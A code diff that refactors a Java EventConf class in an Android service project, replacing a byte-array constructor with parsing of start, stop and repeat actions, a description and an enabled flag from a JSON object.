@@ -7,59 +7,44 @@
 
 package com.android.service.event;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import com.android.service.agent.AgentConf;
-import com.android.service.conf.RunningConf;
+import com.android.service.conf.JSONConf;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class Event.
  */
-public class EventConf implements RunningConf {
-
-	/** Events status. */
-	final public static int EVENT_STOPPED = AgentConf.AGENT_STOPPED;
-
-	/** The Constant EVENT_RUNNING. */
-	final public static int EVENT_RUNNING = AgentConf.AGENT_RUNNING;
-
-	/** Event type. */
-	private final int eventType;
+public class EventConf extends JSONConf {
 
 	/** Event unique ID. */
 	private final int eventId;
 
-	/** Event status: enabled, disabled, running, stopped. */
-	private final int eventAction;
+	public int startAction = -1;
+	public int stopAction = -1;
+	public int repeatAction = -1;
 
-	/** Parameters. */
-	private final byte[] eventParams;
+	final public String desc;
 
-	/**
-	 * Instantiates a new event.
-	 * 
-	 * @param type
-	 *            the type
-	 * @param id
-	 *            the id
-	 * @param action
-	 *            the action
-	 * @param params
-	 *            the params
-	 */
-	public EventConf(final int type, final int id, final int action, final byte[] params) {
-		this.eventType = type;
-		this.eventId = id;
-		this.eventAction = action;
-		this.eventParams = params;
-	}
+	public boolean enabled;
 
-	/**
-	 * Gets the type of the event.
-	 * 
-	 * @return the type
-	 */
-	public Integer getType() {
-		return this.eventType;
+	public EventConf(int eventId, String eventType, JSONObject params) throws JSONException {
+		super(eventType, params);
+
+		this.eventId = eventId;
+		startAction = params.getInt("start");
+
+		if (params.has("stop")) {
+			stopAction = params.getInt("stop");
+		}
+		if (params.has("repeat")) {
+			repeatAction = params.getInt("repeat");
+		}
+		desc = params.getString("desc");
+		enabled = params.getBoolean("enabled");
+
 	}
 
 	/**
@@ -71,21 +56,4 @@ public class EventConf implements RunningConf {
 		return this.eventId;
 	}
 
-	/**
-	 * Gets the action id to trigger.
-	 * 
-	 * @return the action
-	 */
-	public int getAction() {
-		return this.eventAction;
-	}
-
-	/**
-	 * Gets the parameters to parse.
-	 * 
-	 * @return the params
-	 */
-	public byte[] getParams() {
-		return this.eventParams;
-	}
 }
